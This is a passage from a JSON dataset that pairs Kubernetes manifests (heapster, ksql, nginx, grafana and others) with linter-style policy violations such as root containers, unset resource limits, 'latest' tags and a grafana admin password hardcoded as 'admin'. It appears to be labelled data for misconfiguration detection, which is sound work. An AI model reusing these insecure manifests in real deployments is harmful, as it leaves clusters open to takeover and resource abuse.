    "violation_text": "container \"heapster\" is not set to runAsNonRoot"
  },
  {
    "id": "01027",
    "manifest_path": "data/manifests/the_stack_sample/sample_0261.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    k8s-app: heapster\n    name: heapster\n    version: v6\n  name: heapster\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: heapster\n    version: v6\n  template:\n    metadata:\n      labels:\n        k8s-app: heapster\n        version: v6\n    spec:\n      containers:\n      - name: heapster\n        image: kubernetes/heapster:canary\n        imagePullPolicy: Always\n        command:\n        - /heapster\n        - --source=kubernetes:https://10.0.0.1\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        - --service-cluster-ip-range=10.10.0.0/24\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"heapster\" has cpu request 0"
  },
  {
    "id": "01028",
    "manifest_path": "data/manifests/the_stack_sample/sample_0261.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    k8s-app: heapster\n    name: heapster\n    version: v6\n  name: heapster\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: heapster\n    version: v6\n  template:\n    metadata:\n      labels:\n        k8s-app: heapster\n        version: v6\n    spec:\n      containers:\n      - name: heapster\n        image: kubernetes/heapster:canary\n        imagePullPolicy: Always\n        command:\n        - /heapster\n        - --source=kubernetes:https://10.0.0.1\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        - --service-cluster-ip-range=10.10.0.0/24\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"heapster\" has memory limit 0"
  },
  {
    "id": "01029",
    "manifest_path": "data/manifests/the_stack_sample/sample_0263.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ksql\" does not have a read-only root file system"
  },
  {
    "id": "01030",
    "manifest_path": "data/manifests/the_stack_sample/sample_0263.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ksql-datagen-pageviews\" does not have a read-only root file system"
  },
  {
    "id": "01031",
    "manifest_path": "data/manifests/the_stack_sample/sample_0263.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ksql-datagen-users\" does not have a read-only root file system"
  },
  {
    "id": "01032",
    "manifest_path": "data/manifests/the_stack_sample/sample_0263.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ksql\" is not set to runAsNonRoot"
  },
  {
    "id": "01033",
    "manifest_path": "data/manifests/the_stack_sample/sample_0263.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ksql-datagen-pageviews\" is not set to runAsNonRoot"
  },
  {
    "id": "01034",
    "manifest_path": "data/manifests/the_stack_sample/sample_0263.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ksql-datagen-users\" is not set to runAsNonRoot"
  },
  {
    "id": "01035",
    "manifest_path": "data/manifests/the_stack_sample/sample_0263.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ksql\" has cpu request 0"
  },
  {
    "id": "01036",
    "manifest_path": "data/manifests/the_stack_sample/sample_0263.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ksql-datagen-pageviews\" has cpu request 0"
  },
  {
    "id": "01037",
    "manifest_path": "data/manifests/the_stack_sample/sample_0263.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ksql-datagen-users\" has cpu request 0"
  },
  {
    "id": "01038",
    "manifest_path": "data/manifests/the_stack_sample/sample_0263.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ksql\" has memory limit 0"
  },
  {
    "id": "01039",
    "manifest_path": "data/manifests/the_stack_sample/sample_0263.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ksql-datagen-pageviews\" has memory limit 0"
  },
  {
    "id": "01040",
    "manifest_path": "data/manifests/the_stack_sample/sample_0263.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ksql-datagen-users\" has memory limit 0"
  },
  {
    "id": "01041",
    "manifest_path": "data/manifests/the_stack_sample/sample_0265.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6084\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01042",
    "manifest_path": "data/manifests/the_stack_sample/sample_0265.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6084\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01043",
    "manifest_path": "data/manifests/the_stack_sample/sample_0265.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6084\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01044",
    "manifest_path": "data/manifests/the_stack_sample/sample_0265.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6084\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01045",
    "manifest_path": "data/manifests/the_stack_sample/sample_0265.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6084\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01046",
    "manifest_path": "data/manifests/the_stack_sample/sample_0266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "01047",
    "manifest_path": "data/manifests/the_stack_sample/sample_0266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container2\" does not have a read-only root file system"
  },
  {
    "id": "01048",
    "manifest_path": "data/manifests/the_stack_sample/sample_0266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"container1\" is not set to runAsNonRoot"
  },
  {
    "id": "01049",
    "manifest_path": "data/manifests/the_stack_sample/sample_0266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"container2\" is not set to runAsNonRoot"
  },
  {
    "id": "01050",
    "manifest_path": "data/manifests/the_stack_sample/sample_0266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "01051",
    "manifest_path": "data/manifests/the_stack_sample/sample_0266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container2\" has cpu request 0"
  },
  {
    "id": "01052",
    "manifest_path": "data/manifests/the_stack_sample/sample_0266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "01053",
    "manifest_path": "data/manifests/the_stack_sample/sample_0266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container2\" has memory limit 0"
  },
  {
    "id": "01054",
    "manifest_path": "data/manifests/the_stack_sample/sample_0268.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: monitoring\n  name: grafana-deployment\nspec:\n  selector:\n    matchLabels:\n      app: grafana-deployment\n  template:\n    metadata:\n      labels:\n        app: grafana-deployment\n    spec:\n      securityContext:\n        runAsUser: 472\n        fsGroup: 472\n      containers:\n      - name: grafana\n        image: grafana/grafana\n        env:\n        - name: GF_SECURITY_ADMIN_PASSWORD\n          value: admin\n        - name: GF_INSTALL_PLUGINS\n          value: grafana-clock-panel,grafana-piechart-panel,camptocamp-prometheus-alertmanager-datasource,vonage-status-panel,alexanderzobnin-zabbix-app,grafana-worldmap-panel,raintank-worldping-app,agenty-flowcharting-panel\n        ports:\n        - containerPort: 3000\n        volumeMounts:\n        - name: grafana-storage\n          mountPath: /var/lib/grafana\n      volumes:\n      - name: grafana-storage\n        persistentVolumeClaim:\n          claimName: grafana-pvc\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"grafana\" is using an invalid container image, \"grafana/grafana\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01055",
    "manifest_path": "data/manifests/the_stack_sample/sample_0268.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: monitoring\n  name: grafana-deployment\nspec:\n  selector:\n    matchLabels:\n      app: grafana-deployment\n  template:\n    metadata:\n      labels:\n        app: grafana-deployment\n    spec:\n      securityContext:\n        runAsUser: 472\n        fsGroup: 472\n      containers:\n      - name: grafana\n        image: grafana/grafana\n        env:\n        - name: GF_SECURITY_ADMIN_PASSWORD\n          value: admin\n        - name: GF_INSTALL_PLUGINS\n          value: grafana-clock-panel,grafana-piechart-panel,camptocamp-prometheus-alertmanager-datasource,vonage-status-panel,alexanderzobnin-zabbix-app,grafana-worldmap-panel,raintank-worldping-app,agenty-flowcharting-panel\n        ports:\n        - containerPort: 3000\n        volumeMounts:\n        - name: grafana-storage\n          mountPath: /var/lib/grafana\n      volumes:\n      - name: grafana-storage\n        persistentVolumeClaim:\n          claimName: grafana-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"grafana\" does not have a read-only root file system"
  },
  {
    "id": "01056",
    "manifest_path": "data/manifests/the_stack_sample/sample_0268.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: monitoring\n  name: grafana-deployment\nspec:\n  selector:\n    matchLabels:\n      app: grafana-deployment\n  template:\n    metadata:\n      labels:\n        app: grafana-deployment\n    spec:\n      securityContext:\n        runAsUser: 472\n        fsGroup: 472\n      containers:\n      - name: grafana\n        image: grafana/grafana\n        env:\n        - name: GF_SECURITY_ADMIN_PASSWORD\n          value: admin\n        - name: GF_INSTALL_PLUGINS\n          value: grafana-clock-panel,grafana-piechart-panel,camptocamp-prometheus-alertmanager-datasource,vonage-status-panel,alexanderzobnin-zabbix-app,grafana-worldmap-panel,raintank-worldping-app,agenty-flowcharting-panel\n        ports:\n        - containerPort: 3000\n        volumeMounts:\n        - name: grafana-storage\n          mountPath: /var/lib/grafana\n      volumes:\n      - name: grafana-storage\n        persistentVolumeClaim:\n          claimName: grafana-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"grafana\" has cpu request 0"
  },
  {
    "id": "01057",
    "manifest_path": "data/manifests/the_stack_sample/sample_0268.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: monitoring\n  name: grafana-deployment\nspec:\n  selector:\n    matchLabels:\n      app: grafana-deployment\n  template:\n    metadata:\n      labels:\n        app: grafana-deployment\n    spec:\n      securityContext:\n        runAsUser: 472\n        fsGroup: 472\n      containers:\n      - name: grafana\n        image: grafana/grafana\n        env:\n        - name: GF_SECURITY_ADMIN_PASSWORD\n          value: admin\n        - name: GF_INSTALL_PLUGINS\n          value: grafana-clock-panel,grafana-piechart-panel,camptocamp-prometheus-alertmanager-datasource,vonage-status-panel,alexanderzobnin-zabbix-app,grafana-worldmap-panel,raintank-worldping-app,agenty-flowcharting-panel\n        ports:\n        - containerPort: 3000\n        volumeMounts:\n        - name: grafana-storage\n          mountPath: /var/lib/grafana\n      volumes:\n      - name: grafana-storage\n        persistentVolumeClaim:\n          claimName: grafana-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"grafana\" has memory limit 0"
  },
  {
    "id": "01058",
    "manifest_path": "data/manifests/the_stack_sample/sample_0269.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-taint\nspec:\n  containers:\n  - name: nginx-image\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx-image\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01059",
    "manifest_path": "data/manifests/the_stack_sample/sample_0269.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-taint\nspec:\n  containers:\n  - name: nginx-image\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-image\" does not have a read-only root file system"
  },
  {
    "id": "01060",
    "manifest_path": "data/manifests/the_stack_sample/sample_0269.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-taint\nspec:\n  containers:\n  - name: nginx-image\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-image\" is not set to runAsNonRoot"
  },
  {
    "id": "01061",
    "manifest_path": "data/manifests/the_stack_sample/sample_0269.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-taint\nspec:\n  containers:\n  - name: nginx-image\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-image\" has cpu request 0"
  },
  {
    "id": "01062",
    "manifest_path": "data/manifests/the_stack_sample/sample_0269.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-taint\nspec:\n  containers:\n  - name: nginx-image\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-image\" has memory limit 0"
  },
  {
    "id": "01063",
    "manifest_path": "data/manifests/the_stack_sample/sample_0272.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: addresses-service-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: addresses-service\n  template:\n    metadata:\n      labels:\n        app: addresses-service\n    spec:\n      containers:\n      - name: addresses-service\n        image: stokei/addresses-service:latest\n        resources: {}\n        imagePullPolicy: Always\n        env:\n        - name: DB_NAME\n          value: addresses\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-host\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-user\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-password\n        - name: DB_OPTIONS\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-options\n        - name: DB_PREFIX\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-prefix\n        - name: DB_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-timeout\n        - name: QUEUE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-host\n        - name: QUEUE_PORT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-port\n        - name: QUEUE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-password\n        - name: QUEUE_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-timeout\n        - name: MICROSERVICE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq-secret\n              key: url\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"addresses-service\" is using an invalid container image, \"stokei/addresses-service:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01064",
    "manifest_path": "data/manifests/the_stack_sample/sample_0272.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: addresses-service-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: addresses-service\n  template:\n    metadata:\n      labels:\n        app: addresses-service\n    spec:\n      containers:\n      - name: addresses-service\n        image: stokei/addresses-service:latest\n        resources: {}\n        imagePullPolicy: Always\n        env:\n        - name: DB_NAME\n          value: addresses\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-host\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-user\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-password\n        - name: DB_OPTIONS\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-options\n        - name: DB_PREFIX\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-prefix\n        - name: DB_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-timeout\n        - name: QUEUE_HOST\n          valueFrom:\n            